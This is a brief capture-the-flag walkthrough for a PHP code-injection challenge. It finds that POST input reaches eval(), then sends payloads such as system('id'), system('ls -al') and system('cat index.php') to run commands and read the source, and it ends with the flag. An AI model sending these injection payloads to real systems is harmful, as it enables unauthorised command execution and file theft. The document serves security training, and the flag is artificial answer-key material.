Actions: INSPECT WEBPAGE/RESOURCE: Analyze the webpage for unusual elements.
ERROR DISCOVERY: Trigger an error by sending a malformed POST request: statement={{}}
PHP EVALUATION: Discover that the website uses PHP eval() to evaluate user input.
COMMAND EXECUTION: Execute a command using the system() function: statement=system('id')
DIRECTORY LISTING: List the directory contents using the system() function: statement=system('ls -al')
FILE PRINTING: Print the contents of the index.php file: statement=system('cat index.php')
FLAG EXTRACTION: Find the flag in the printed index.php file: auctf{p6p_1nj3c7i0n_iz_k3wl}
